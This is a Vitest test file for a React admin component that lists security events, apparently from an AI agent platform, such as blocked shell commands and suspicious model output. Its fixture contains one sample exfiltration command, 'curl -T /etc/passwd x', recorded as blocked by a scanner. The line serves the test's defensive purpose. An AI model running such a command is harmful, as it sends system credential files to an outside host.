// @vitest-environment jsdom

import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import type { SecurityEvent } from '@/hooks/useAdmin';
import { SecurityEventList } from './SecurityEventList';

const base: SecurityEvent = {
  createdAt: '2026-09-01T00:00:00Z',
  error: 'blocked by shell command scanner: curl upload',
  eventType: 'SHELL_BLOCK',
  externalTicketId: 'JIRA-9',
  id: 'e1',
  inputJson: { command: 'curl -T /etc/passwd x' },
  nodeId: 'executeImplementation',
  outputJson: null,
  runId: 'run-9',
  startedAt: '2026-09-01T00:00:00Z',
  toolName: 'bash',
  workflowId: 'eng-acme-svc-JIRA-9',
  workRequestId: 'wr-9',
};

describe('SecurityEventList', () => {
  it('links an event to its run, outside the row toggle', () => {
    render(<SecurityEventList events={[base]} showRunLink />);

    const link = screen.getByRole('link', { name: 'JIRA-9' });
    expect(link.getAttribute('href')).toBe('/runs/run-9');
    // A link nested inside a <button> is invalid and unreachable by keyboard.
    expect(link.closest('button')).toBeNull();
  });

  it('shows the workflow ID for an event from a workflow that keeps no run', () => {
    render(
      <SecurityEventList
        events={[{ ...base, externalTicketId: null, runId: null, workflowId: 'eval-run-42' }]}
        showRunLink
      />
    );

    expect(screen.queryByRole('link')).toBeNull();
    expect(screen.getByText('eval-run-42')).toBeTruthy();
  });

  it('still expands the detail from the row button', () => {
    render(<SecurityEventList events={[base]} showRunLink />);

    // The summary line already shows the command; expanding adds the detail block.
    const before = screen.getAllByText(/curl -T/).length;
    fireEvent.click(screen.getByRole('button'));

    expect(screen.getAllByText(/curl -T/).length).toBeGreaterThan(before);
  });
});

describe('SecurityEventList rows', () => {
  it('is only a toggle when the event has detail, and shows the absolute time on hover', () => {
    const noDetail: SecurityEvent = {
      ...base,
      eventType: 'LLM_SUSPICIOUS',
      id: 'e2',
      inputJson: null,
      outputJson: { warnings: [] },
    };
    render(<SecurityEventList events={[noDetail]} />);
    expect(screen.queryByRole('button')).toBeNull();
    const time = document.querySelector('time');
    expect(time?.getAttribute('title')).toMatch(/2026/);
  });

  it('names an event type in words, not enum text', () => {
    render(<SecurityEventList events={[base]} />);
    expect(screen.getByText('Command blocked')).toBeTruthy();
  });
});
